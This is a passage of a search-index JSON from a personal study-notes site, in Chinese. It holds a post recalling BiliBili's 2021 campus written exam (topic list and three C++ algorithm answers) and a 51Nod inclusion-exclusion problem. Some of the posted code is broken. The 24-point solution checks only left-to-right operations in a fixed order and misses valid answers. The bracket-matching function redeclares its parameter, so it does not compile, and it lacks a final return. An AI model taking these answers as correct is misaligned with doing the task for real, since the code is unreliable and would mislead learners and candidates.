\u9009\u62e9\u9898\u57fa\u672c\u4e0a\u662f\u8ba1\u7b97\u673a\u8003\u7814408\u7684\u5185\u5bb9\uff0c\u6570\u636e\u7ed3\u6784\u3001\u8ba1\u7b97\u673a\u7f51\u7edc\u3001\u8ba1\u7b97\u673a\u7ec4\u6210\u3001\u64cd\u4f5c\u7cfb\u7edf\u8fd9\u4e9b\u9898\u76ee\u4e71\u5e8f\u5730\u6765\u3002\u96be\u5ea6\u4e2d\u7b49\uff0c\u5982\u679c\u80fd\u628a408\u7684\u4e66\u591a\u770b\u51e0\u904d\u5e94\u8be5\u95ee\u9898\u5c31\u4e0d\u5927\u3002 \u80fd\u56de\u5fc6\u8d77\u6765\u7684\u5185\u5bb9\u5927\u6982\u662f\u8fd9\u4e9b\uff1a 3.1 \u6570\u636e\u7ed3\u6784 # \u6811\u7684\u904d\u5386\uff0c\u6839\u636e\u524d\u5e8f\u4e2d\u5e8f\u63a8\u540e\u5e8f\u4e4b\u7c7b\u7684\uff0c2\u9898 \u6392\u5e8f\u7b97\u6cd5\uff0c\u5404\u79cd\u6392\u5e8f\u7684\u590d\u6742\u5ea6\uff0c\u6392\u5e8f\u65b9\u5f0f\u7b49\u7b49\uff0c3-4\u9898 \u903b\u8f91\u7ed3\u6784\u7279\u70b9\uff0c\u5224\u65ad\u662f\u4e0d\u662f\u7ebf\u6027\u7ed3\u6784\u4e4b\u7c7b\u7684\uff0c2\u9898 \u5185\u5b58\u5927\u5c0f\uff0c64\u4f4dLinux\u4e0b\uff0cchar a[10]\uff0cchar *b = (char *)malloc(10* sizeof(char))\uff0csizeof(a)\u548csizeof(b)\uff0c\u5927\u5c0f\u662f\u591a\u5c11\uff0c\u7b54\u6848\u662f10\u548c8\uff0c1\u9898 3.2 \u8ba1\u7b97\u673a\u7f51\u7edc # TCP\u6ed1\u52a8\u7a97\u53e3\u534f\u8bae\uff0c\u8ba1\u7b97\uff0c1\u9898 OSI\u5206\u5c42\u7ed3\u6784\uff0c\u6570\u636e\u94fe\u8def\u5c42\u7684\u529f\u80fd\u7b49\u7b49\uff0c1-2\u9898 CRC\u6821\u9a8c\u7801\uff0c\u8ba1\u7b97\uff0c1\u9898 \u7f51\u7edc\u534f\u8bae\uff0cping\u4f1a\u7528\u5230\u54ea\u4e9b\u534f\u8bae\u7b49\u7b49\uff0c2-3\u9898 3.3 \u64cd\u4f5c\u7cfb\u7edf # \u5185\u5b58\u6cc4\u9732\uff0c\u5728\u54ea\u79cd\u60c5\u51b5\u4e0b\u4f1a\u5bfc\u81f4\u5185\u5b58\u6cc4\u9732\uff0c1\u9898 Linux\u547d\u4ee4\uff0c\u521b\u5efa\u6587\u4ef6\u547d\u4ee4\uff0c1\u9898 3.4 \u8ba1\u7b97\u673a\u7ec4\u6210 # \u8fdb\u5236\u8f6c\u6362\uff0c8\u8fdb\u5236\u548c2\u8fdb\u5236\u8f6c10\u8fdb\u5236\uff0c\u6bd4\u8f83\u5927\u5c0f\uff0c2\u9898 3.5 \u5176\u4ed6 # \u8f6f\u4ef6\u5de5\u7a0b\uff0c\u8bbe\u8ba1\u6a21\u5f0f\uff0c\u8003\u7684\u5e94\u8be5\u662f\u88c5\u9970\u6a21\u5f0f\u7684\u7279\u70b9\uff0c1\u9898 \u6570\u636e\u5e93\uff0cSQL\u8bed\u53e5\uff0c1\u9898 \u7f51\u7edc\u5b89\u5168\uff0cCSRF\u653b\u51fb\u5982\u4f55\u9632\u62a4\uff0c1\u9898 4. \u7b97\u6cd5\u9898 # 3\u9053\u7b97\u6cd5\u9898\u90fd\u6bd4\u8f83\u7b80\u5355\uff0c\u5728\u725b\u5ba2\u7f51\u4e0a\u770b\u5230\u6709\u4eba\u53d1\u7edf\u8ba1\u95ee\u5377\uff0c70%\u4ee5\u4e0a\u90fdAK\u4e86\u3002 4.1 \u7b2c\u4e00\u9898 # \u7b9724\u70b9\uff0c\u7ed94\u4e2a\u6570\u5b57\uff0c\u5224\u65ad\u80fd\u5426\u901a\u8fc7\u56db\u5219\u8fd0\u7b97\u7b97\u51fa24\u3002 \u9898\u76ee\u662f\u7c7b\u4f3c\u4e8e leetcode \u7684\u90a3\u79cd\uff0c\u5728\u7ed9\u5b9a\u7684\u51fd\u6570\u91cc\u9762\u5199\u4ee3\u7801\uff0c\u53ea\u8981\u8fd4\u56de\u503c\uff0c\u4e0d\u9700\u8981\u8f93\u51fa\u3002 \u8fd9\u9898\u6570\u5b57\u6bd4\u8f83\u5c11\uff0c\u76f4\u63a5\u66b4\u529b\u5c31\u80fd\u7b97\u3002 double calculate(double x, double y, int countFlag) { if (countFlag == 0) { return x + y; } else if (countFlag == 1) { return x - y; } else if (countFlag == 2) { return x * y; } else if (countFlag == 3) { return x / y; } return 0; } bool method(int * arr, int length){ double ans; for (size_t i = 0; i < 4; i++) { ans = calculate(arr[0], arr[1], i); for (size_t j = 0; j < 4; j++) { ans = calculate(ans, arr[2], j); for (size_t k = 0; k < 4; k++) { ans = calculate(ans, arr[3], k); if (ans == 24) { return true; } } } } return false; } 4.2 \u7b2c\u4e8c\u9898 # \u62ec\u53f7\u5339\u914d\uff0c ( \uff0c { \uff0c [ \uff0c\u4e09\u79cd\u62ec\u53f7\uff0c\u8981\u6c42\u80fd\u4f9d\u6b21\u4e00\u4e00\u914d\u5bf9\u3002 \u6bd4\u5982 ([]) \u8f93\u51fa true \uff0c [(]) \u8f93\u51fa false \u3002 vector \u6a21\u62df\u6808\u8f93\u5165\u8f93\u51fa\u5373\u53ef\u3002 bool method(string s){ string s; vector<char> vt; for (size_t i = 0; i < s.size(); i++) { if (s[i] == '(') { vt.push_back(s[i]); } else if (s[i] == '{') { vt.push_back(s[i]); } else if (s[i] == '[') { vt.push_back(s[i]); } else if (s[i] == ')') { if (vt.size() > 0 && vt.back() == '(') { vt.pop_back(); } else { return false; } } else if (s[i] == '}') { if (vt.size() > 0 && vt.back() == '{') { vt.pop_back(); } else { return false; } } else if (s[i] == ']') { if (vt.size() > 0 && vt.back() == '[') { vt.pop_back(); } else { return false; } } } if (vt.size() == 0) { return true; } } 4.3 \u7b2c\u4e09\u9898 # \u5047\u7684\u80cc\u5305\u95ee\u9898\uff0c\u73b0\u5728\u6211\u4eec\u6709 1024 \u5143\uff0c\u8d2d\u4e70 N \u5143\u4e1c\u897f\u4ee5\u540e\uff0c\u7528 64 \u5143\uff0c 16 \u5143\uff0c 4 \u5143\u548c 1 \u5143\u7684\u786c\u5e01\u627e\u96f6\uff0c\u6700\u5c11\u80fd\u627e\u56de\u51e0\u4e2a\u786c\u5e01\u3002 \u672c\u6765\u4ee5\u4e3a\u8981\u7528DP\uff0c\u540e\u6765\u53d1\u73b0\u76f4\u63a5\u8d2a\u5fc3\u5c31\u53ef\u4ee5\u4e86\u3002 int method(int N){ int left = 1024; int count64 = 0, count16 = 0, count4 = 0, count1 = 0; left -= N; while (left != 0) { if (left >= 64) { left -= 64; count64++; } else if (left >= 16) { left -= 16; count16++; } else if (left >= 4) { left -= 4; count4++; } else { left -= 1; count1++; } } int ans = count64 + count16 + count4 + count1; return ans; } 5. \u5f80\u5e74\u8bd5\u9898 # \u54d4\u54e9\u54d4\u54e92020\u6821\u56ed\u62db\u8058\u540e\u7aef\u7b14\u8bd5\u5377\uff08\u4e8c\uff09 \u54d4\u54e9\u54d4\u54e92020\u6821\u56ed\u62db\u8058\u540e\u7aef\u7b14\u8bd5\u5377\uff08\u4e00\uff09 \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.2021\u5c4aBiliBili \u6570\u636e\u5206\u6790 \u540e\u7aef\u5f00\u53d1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AF%95%E9%A2%98/1.2021%E5%B1%8ABiliBili_%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90_%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/#2021bilibili","text":"","title":"2021\u5c4aBiliBili\u6821\u62db \u6570\u636e\u5206\u6790/\u540e\u7aef\u5f00\u53d1 \u7b14\u8bd5\u9898\u8bb0\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AF%95%E9%A2%98/1.2021%E5%B1%8ABiliBili_%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90_%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/#_1","text":"[toc]","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AF%95%E9%A2%98/1.2021%E5%B1%8ABiliBili_%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90_%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/#1","text":"\u6700\u8fd1\u505a\u4e86BiliBili2021\u5c4a\u6821\u62db\u6570\u636e\u5206\u6790\u5c97\u7684\u7b14\u8bd5\u9898\uff0c\u548c\u540e\u7aef\u5f00\u53d1\u662f\u540c\u4e00\u5957\u9898\uff0c\u4e4b\u524d\u5728\u627e\u76f8\u5173\u8d44\u6599\u7684\u65f6\u5019\u6ca1\u6709\u53d1\u73b0\u6570\u636e\u5206\u6790\u7b14\u8bd5\u9898\u578b\u7684\u4fe1\u606f\uff0c\u4e8e\u662f\u505a\u5b8c\u4ee5\u540e\u53d1\u4e2a\u5e16\u51fa\u6765\u7ed9\u5927\u5bb6\u53c2\u8003\u3002","title":"1. \u80cc\u666f"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AF%95%E9%A2%98/1.2021%E5%B1%8ABiliBili_%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90_%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/#2","text":"\u65f6\u95f4\u4e00\u5171\u662f105\u5206\u949f\uff0c30\u9053\u9009\u62e9\u9898\uff0c\u517160\u5206\uff0c3\u9053\u7b97\u6cd5\u9898\uff0c\u517160\u5206\uff0c\u52a0\u8d77\u6765120\u5206\u3002 \u672c\u6765\u7ed9\u7b97\u6cd5\u9898\u6bcf\u9898\u5206\u4e8620\u5206\u949f\uff0c\u6bcf\u9053\u9009\u62e9\u9898\u5927\u69821-2\u5206\u949f\uff0c\u6700\u540e\u505a\u5b8c\u9009\u62e9\u9898\u8fd8\u5269\u4e0b70\u5206\u949f\uff0c\u4eca\u5e74\u7b97\u6cd5\u9898\u975e\u5e38\u7b80\u5355\uff0c\u63d0\u524d25\u5206\u949f\u505a\u5b8c\u4e86\uff0c\u611f\u89c9\u9009\u62e9\u9898\u662f\u91cd\u70b9\u3002","title":"2. \u9898\u578b"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AF%95%E9%A2%98/1.2021%E5%B1%8ABiliBili_%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90_%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/#3","text":"\u9009\u62e9\u9898\u57fa\u672c\u4e0a\u662f\u8ba1\u7b97\u673a\u8003\u7814408\u7684\u5185\u5bb9\uff0c\u6570\u636e\u7ed3\u6784\u3001\u8ba1\u7b97\u673a\u7f51\u7edc\u3001\u8ba1\u7b97\u673a\u7ec4\u6210\u3001\u64cd\u4f5c\u7cfb\u7edf\u8fd9\u4e9b\u9898\u76ee\u4e71\u5e8f\u5730\u6765\u3002\u96be\u5ea6\u4e2d\u7b49\uff0c\u5982\u679c\u80fd\u628a408\u7684\u4e66\u591a\u770b\u51e0\u904d\u5e94\u8be5\u95ee\u9898\u5c31\u4e0d\u5927\u3002 \u80fd\u56de\u5fc6\u8d77\u6765\u7684\u5185\u5bb9\u5927\u6982\u662f\u8fd9\u4e9b\uff1a","title":"3. \u9009\u62e9\u9898\u8303\u56f4"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AF%95%E9%A2%98/1.2021%E5%B1%8ABiliBili_%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90_%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/#31","text":"\u6811\u7684\u904d\u5386\uff0c\u6839\u636e\u524d\u5e8f\u4e2d\u5e8f\u63a8\u540e\u5e8f\u4e4b\u7c7b\u7684\uff0c2\u9898 \u6392\u5e8f\u7b97\u6cd5\uff0c\u5404\u79cd\u6392\u5e8f\u7684\u590d\u6742\u5ea6\uff0c\u6392\u5e8f\u65b9\u5f0f\u7b49\u7b49\uff0c3-4\u9898 \u903b\u8f91\u7ed3\u6784\u7279\u70b9\uff0c\u5224\u65ad\u662f\u4e0d\u662f\u7ebf\u6027\u7ed3\u6784\u4e4b\u7c7b\u7684\uff0c2\u9898 \u5185\u5b58\u5927\u5c0f\uff0c64\u4f4dLinux\u4e0b\uff0cchar a[10]\uff0cchar *b = (char *)malloc(10* sizeof(char))\uff0csizeof(a)\u548csizeof(b)\uff0c\u5927\u5c0f\u662f\u591a\u5c11\uff0c\u7b54\u6848\u662f10\u548c8\uff0c1\u9898","title":"3.1 \u6570\u636e\u7ed3\u6784"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AF%95%E9%A2%98/1.2021%E5%B1%8ABiliBili_%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90_%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/#32","text":"TCP\u6ed1\u52a8\u7a97\u53e3\u534f\u8bae\uff0c\u8ba1\u7b97\uff0c1\u9898 OSI\u5206\u5c42\u7ed3\u6784\uff0c\u6570\u636e\u94fe\u8def\u5c42\u7684\u529f\u80fd\u7b49\u7b49\uff0c1-2\u9898 CRC\u6821\u9a8c\u7801\uff0c\u8ba1\u7b97\uff0c1\u9898 \u7f51\u7edc\u534f\u8bae\uff0cping\u4f1a\u7528\u5230\u54ea\u4e9b\u534f\u8bae\u7b49\u7b49\uff0c2-3\u9898","title":"3.2 \u8ba1\u7b97\u673a\u7f51\u7edc"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AF%95%E9%A2%98/1.2021%E5%B1%8ABiliBili_%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90_%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/#33","text":"\u5185\u5b58\u6cc4\u9732\uff0c\u5728\u54ea\u79cd\u60c5\u51b5\u4e0b\u4f1a\u5bfc\u81f4\u5185\u5b58\u6cc4\u9732\uff0c1\u9898 Linux\u547d\u4ee4\uff0c\u521b\u5efa\u6587\u4ef6\u547d\u4ee4\uff0c1\u9898","title":"3.3 \u64cd\u4f5c\u7cfb\u7edf"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AF%95%E9%A2%98/1.2021%E5%B1%8ABiliBili_%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90_%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/#34","text":"\u8fdb\u5236\u8f6c\u6362\uff0c8\u8fdb\u5236\u548c2\u8fdb\u5236\u8f6c10\u8fdb\u5236\uff0c\u6bd4\u8f83\u5927\u5c0f\uff0c2\u9898","title":"3.4  \u8ba1\u7b97\u673a\u7ec4\u6210"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AF%95%E9%A2%98/1.2021%E5%B1%8ABiliBili_%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90_%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/#35","text":"\u8f6f\u4ef6\u5de5\u7a0b\uff0c\u8bbe\u8ba1\u6a21\u5f0f\uff0c\u8003\u7684\u5e94\u8be5\u662f\u88c5\u9970\u6a21\u5f0f\u7684\u7279\u70b9\uff0c1\u9898 \u6570\u636e\u5e93\uff0cSQL\u8bed\u53e5\uff0c1\u9898 \u7f51\u7edc\u5b89\u5168\uff0cCSRF\u653b\u51fb\u5982\u4f55\u9632\u62a4\uff0c1\u9898","title":"3.5  \u5176\u4ed6"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AF%95%E9%A2%98/1.2021%E5%B1%8ABiliBili_%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90_%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/#4","text":"3\u9053\u7b97\u6cd5\u9898\u90fd\u6bd4\u8f83\u7b80\u5355\uff0c\u5728\u725b\u5ba2\u7f51\u4e0a\u770b\u5230\u6709\u4eba\u53d1\u7edf\u8ba1\u95ee\u5377\uff0c70%\u4ee5\u4e0a\u90fdAK\u4e86\u3002","title":"4. \u7b97\u6cd5\u9898"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AF%95%E9%A2%98/1.2021%E5%B1%8ABiliBili_%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90_%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/#41","text":"\u7b9724\u70b9\uff0c\u7ed94\u4e2a\u6570\u5b57\uff0c\u5224\u65ad\u80fd\u5426\u901a\u8fc7\u56db\u5219\u8fd0\u7b97\u7b97\u51fa24\u3002 \u9898\u76ee\u662f\u7c7b\u4f3c\u4e8e leetcode \u7684\u90a3\u79cd\uff0c\u5728\u7ed9\u5b9a\u7684\u51fd\u6570\u91cc\u9762\u5199\u4ee3\u7801\uff0c\u53ea\u8981\u8fd4\u56de\u503c\uff0c\u4e0d\u9700\u8981\u8f93\u51fa\u3002 \u8fd9\u9898\u6570\u5b57\u6bd4\u8f83\u5c11\uff0c\u76f4\u63a5\u66b4\u529b\u5c31\u80fd\u7b97\u3002 double calculate(double x, double y, int countFlag) { if (countFlag == 0) { return x + y; } else if (countFlag == 1) { return x - y; } else if (countFlag == 2) { return x * y; } else if (countFlag == 3) { return x / y; } return 0; } bool method(int * arr, int length){ double ans; for (size_t i = 0; i < 4; i++) { ans = calculate(arr[0], arr[1], i); for (size_t j = 0; j < 4; j++) { ans = calculate(ans, arr[2], j); for (size_t k = 0; k < 4; k++) { ans = calculate(ans, arr[3], k); if (ans == 24) { return true; } } } } return false; }","title":"4.1 \u7b2c\u4e00\u9898"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AF%95%E9%A2%98/1.2021%E5%B1%8ABiliBili_%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90_%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/#42","text":"\u62ec\u53f7\u5339\u914d\uff0c ( \uff0c { \uff0c [ \uff0c\u4e09\u79cd\u62ec\u53f7\uff0c\u8981\u6c42\u80fd\u4f9d\u6b21\u4e00\u4e00\u914d\u5bf9\u3002 \u6bd4\u5982 ([]) \u8f93\u51fa true \uff0c [(]) \u8f93\u51fa false \u3002 vector \u6a21\u62df\u6808\u8f93\u5165\u8f93\u51fa\u5373\u53ef\u3002 bool method(string s){ string s; vector<char> vt; for (size_t i = 0; i < s.size(); i++) { if (s[i] == '(') { vt.push_back(s[i]); } else if (s[i] == '{') { vt.push_back(s[i]); } else if (s[i] == '[') { vt.push_back(s[i]); } else if (s[i] == ')') { if (vt.size() > 0 && vt.back() == '(') { vt.pop_back(); } else { return false; } } else if (s[i] == '}') { if (vt.size() > 0 && vt.back() == '{') { vt.pop_back(); } else { return false; } } else if (s[i] == ']') { if (vt.size() > 0 && vt.back() == '[') { vt.pop_back(); } else { return false; } } } if (vt.size() == 0) { return true; } }","title":"4.2 \u7b2c\u4e8c\u9898"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AF%95%E9%A2%98/1.2021%E5%B1%8ABiliBili_%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90_%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/#43","text":"\u5047\u7684\u80cc\u5305\u95ee\u9898\uff0c\u73b0\u5728\u6211\u4eec\u6709 1024 \u5143\uff0c\u8d2d\u4e70 N \u5143\u4e1c\u897f\u4ee5\u540e\uff0c\u7528 64 \u5143\uff0c 16 \u5143\uff0c 4 \u5143\u548c 1 \u5143\u7684\u786c\u5e01\u627e\u96f6\uff0c\u6700\u5c11\u80fd\u627e\u56de\u51e0\u4e2a\u786c\u5e01\u3002 \u672c\u6765\u4ee5\u4e3a\u8981\u7528DP\uff0c\u540e\u6765\u53d1\u73b0\u76f4\u63a5\u8d2a\u5fc3\u5c31\u53ef\u4ee5\u4e86\u3002 int method(int N){ int left = 1024; int count64 = 0, count16 = 0, count4 = 0, count1 = 0; left -= N; while (left != 0) { if (left >= 64) { left -= 64; count64++; } else if (left >= 16) { left -= 16; count16++; } else if (left >= 4) { left -= 4; count4++; } else { left -= 1; count1++; } } int ans = count64 + count16 + count4 + count1; return ans; }","title":"4.3 \u7b2c\u4e09\u9898"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AF%95%E9%A2%98/1.2021%E5%B1%8ABiliBili_%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90_%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/#5","text":"\u54d4\u54e9\u54d4\u54e92020\u6821\u56ed\u62db\u8058\u540e\u7aef\u7b14\u8bd5\u5377\uff08\u4e8c\uff09 \u54d4\u54e9\u54d4\u54e92020\u6821\u56ed\u62db\u8058\u540e\u7aef\u7b14\u8bd5\u5377\uff08\u4e00\uff09 \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"5. \u5f80\u5e74\u8bd5\u9898"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/1.51Nod_2409_%E5%90%AF%E8%92%99%E7%BB%83%E4%B9%A0-%E5%80%8D%E6%95%B0%E7%9A%84%E4%B8%AA%E6%95%B0/","text":"51Nod 2409 \u542f\u8499\u7ec3\u4e60-\u500d\u6570\u7684\u4e2a\u6570 # \u76ee\u5f55 # 51Nod 2409 \u542f\u8499\u7ec3\u4e60-\u500d\u6570\u7684\u4e2a\u6570 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1000 ms Memory Limit: 131072 kB 1.2. Problem Description # \u8bfb\u5165 N \uff0c\u6c42\u51fa 1..N \u7684\u8303\u56f4\u5185\u6240\u6709 2 \u6216 3 \u6216 5 \u7684\u500d\u6570\u4e00\u5171\u6709\u591a\u5c11\u4e2a\uff1f 1.3. Input # \u8f93\u5165\u4e00\u4e2a\u6570 N 1.4. Output # \u8f93\u51fa\u4e00\u4e2a\u6570\uff0c\u8868\u793a\u8fd9\u6837\u7684\u6570\u7684\u4e2a\u6570 1.5. Sample Input # 10 1.6. Sample Output # 8 1.7. Source # 51Nod 2409 \u542f\u8499\u7ec3\u4e60-\u500d\u6570\u7684\u4e2a\u6570 2. \u89e3\u8bfb # \u627e\u51fa [1, n] \u8303\u56f4\u5185 2\u30013\u30015 \u7684\u500d\u6570\uff0c\u4e3a\u53bb\u9664\u91cd\u590d\u8ba1\u6570\uff0c\u51cf\u53bb\u4ed6\u4eec\u4e24\u4e24\u7ec4\u5408\u6784\u6210\u7684\u5171\u540c\u7684\u500d\u6570\uff0c\u5373 [1, n] \u8303\u56f4\u5185 6\u300110\u300115 \u7684\u500d\u6570\u3002 \u56e0\u4e3a\u51cf\u53bb\u4e86\u4e24\u4e24\u7ec4\u5408\u7684\u500d\u6570\uff0c\u4e09\u4e2a\u6570\u5b57\u76f8\u4e58\u7684\u500d\u6570\uff0c\u5373 30 \u7684\u500d\u6570\u88ab\u51cf\u6389\u4e86\uff0c\u6240\u4ee5\u518d\u52a0\u4e0a 30 \u7684\u500d\u6570\uff0c\u5373\u53ef\u5f97\u51fa\u7b54\u6848\u3002 3. \u4ee3\u7801 # #include <iostream> using namespace std; int main() { long long n; // \u8bfb\u5165n scanf(\"%lld\", &n); // \u627e\u51fa[1, n]\u8303\u56f4\u51852\u30013\u30015\u7684\u500d\u6570 long long nDivBy2 = n / 2l; long long nDivBy3 = n / 3l; long long nDivBy5 = n / 5l; // \u627e\u51fa[1, n]\u8303\u56f4\u51856\u300110\u300115\u300130\u7684\u500d\u6570 long long nDivBy6 = n / 6l; long long nDivBy10 = n / 10l; long long nDivBy15 = n / 15l; long long nDivBy30 = n / 30l; long long ans = nDivBy2 + nDivBy3 + nDivBy5 - nDivBy6 - nDivBy10 - nDivBy15 + nDivBy30; // \u8f93\u51fa printf(\"%lld\\n\", ans); } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.51Nod 2409 \u542f\u8499\u7ec3\u4e60 \u500d\u6570\u7684\u4e2a\u6570"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/1.51Nod_2409_%E5%90%AF%E8%92%99%E7%BB%83%E4%B9%A0-%E5%80%8D%E6%95%B0%E7%9A%84%E4%B8%AA%E6%95%B0/#51nod-2409-","text":"","title":"51Nod 2409 \u542f\u8499\u7ec3\u4e60-\u500d\u6570\u7684\u4e2a\u6570"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/1.51Nod_2409_%E5%90%AF%E8%92%99%E7%BB%83%E4%B9%A0-%E5%80%8D%E6%95%B0%E7%9A%84%E4%B8%AA%E6%95%B0/#_1","text":"51Nod 2409 \u542f\u8499\u7ec3\u4e60-\u500d\u6570\u7684\u4e2a\u6570 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/1.51Nod_2409_%E5%90%AF%E8%92%99%E7%BB%83%E4%B9%A0-%E5%80%8D%E6%95%B0%E7%9A%84%E4%B8%AA%E6%95%B0/#1","text":"","title":"1. 